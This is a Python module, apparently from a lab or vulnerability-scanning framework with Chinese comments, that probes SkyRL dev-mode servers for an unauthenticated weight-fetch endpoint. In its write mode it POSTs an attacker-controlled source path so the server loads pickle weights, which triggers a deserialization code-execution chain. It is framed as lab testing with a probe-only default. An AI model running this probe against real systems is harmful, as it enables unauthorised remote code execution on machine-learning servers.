"""SkyRL 开发模式反序列化 — 强制 dev-mode + 0.0.0.0 + 未鉴权 /fetch_weights → pickle 执行。

Ruling: 实验室以 slime /pull_weights 同构承载「未鉴权权重拉取→反序列化」类（fetch_weights 语义：服务端从攻击者可控源拉权重并加载；靶场 writes=True：probe-only 仅 GET 指纹，POST 仅 backup-write）。
"""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path

KEY = "skyrl-dev-pickle-rce"
WRITES = True
TIMEOUT = 3


def _mask(value) -> str:
    """凭据脱敏：MOCK 前缀 + 尾 4 位；全文仅存证据 trace（归档层）。"""
    s = str(value)
    return f"MOCK****{s[-4:]}" if len(s) > 8 else "MOCK****"


def _resolve_mode(params: dict) -> tuple[str, str]:
    """backup-write 仅当模块 writes=True 且提供 backup_targets；否则降级 probe-only。"""
    if params.get("mode") != "backup-write":
        return "probe-only", ""
    if WRITES and params.get("backup_targets"):
        return "backup-write", ""
    return "probe-only", "降级probe-only（backup-write 需 backup_targets）"


def _target(params: dict) -> str:
    return str(params.get("target") or "").rstrip("/")


class Trace:
    """HTTP 全量 trace（请求+响应+错误），写 ctx['run'].dir/traces/<key>.json 后作 artifact。"""

    def __init__(self, ctx: dict):
        d = Path(ctx["run"].dir) / "traces"
        d.mkdir(parents=True, exist_ok=True)
        self.path = d / f"{KEY}.json"
        self.entries: list[dict] = []

    def call(self, method: str, url: str, body=None, headers: dict | None = None):
        entry = {"ts": round(time.time(), 3), "method": method, "url": url,
                 "body": body, "headers": dict(headers or {})}
        data = json.dumps(body).encode("utf-8") if body is not None else None
        req = urllib.request.Request(url, data=data, method=method)
        if data is not None:
            req.add_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                raw, status = resp.read(), resp.status
        except urllib.error.HTTPError as exc:
            raw, status = exc.read(), exc.code
        except Exception as exc:
            entry.update(status=0, error=f"{type(exc).__name__}: {exc}")
            self.entries.append(entry)
            return entry
        text = raw.decode("utf-8", "replace")
        try:
            payload = json.loads(text)
        except ValueError:
            payload = text
        entry.update(status=status, response=payload)
        self.entries.append(entry)
        return entry

    def dump(self) -> Path:
        self.path.write_text(
            json.dumps({"module": KEY, "entries": self.entries}, ensure_ascii=False, indent=1),
            encoding="utf-8")
        return self.path


def _ok(entry: dict | None) -> bool:
    return entry is not None and entry.get("status") == 200


def _resp(entry: dict | None) -> dict:
    r = (entry or {}).get("response")
    return r if isinstance(r, dict) else {}


def run(ctx: dict, params: dict) -> dict:
    target = _target(params)
    mode, note = _resolve_mode(params)
    if not target:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    marker = str(ctx.get("marker") or "TRIDENT")
    t = Trace(ctx)
    fp = t.call("GET", f"{target}/pull_weights")
    findings = []
    fetch = None
    if mode == "backup-write":
        fetch = t.call("POST", f"{target}/pull_weights", {
            "source_dir": f"/attacker/pickle-weights-{marker}",
            "local_checkpoint_dir": f"/checkpoints/skyrl-fetch-{marker}",
        })
        if _ok(fetch):
            detail = {"route": "/pull_weights(同构承载 /fetch_weights)", "auth": "none",
                      "source_dir": f"/attacker/pickle-weights-{marker}",
                      "server_marker": _resp(fetch).get("marker", ""),
                      "note": "dev-mode+0.0.0.0+未鉴权权重拉取：攻击者可控权重源（pickle 载荷）被执行加载"}
            findings.append({"sev": "high", "title": "SkyRL dev-mode /fetch_weights 同构面：未鉴权拉取攻击者可控权重源（pickle 执行链）",
                             "detail": json.dumps(detail, ensure_ascii=False)})
    artifact = t.dump()
    summary = (f"指纹={fp.get('status')} 拉取={fetch.get('status') if fetch else 'skipped(probe-only 不触碰写面)'} mode={mode}")
    if note:
        summary += f"；{note}"
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
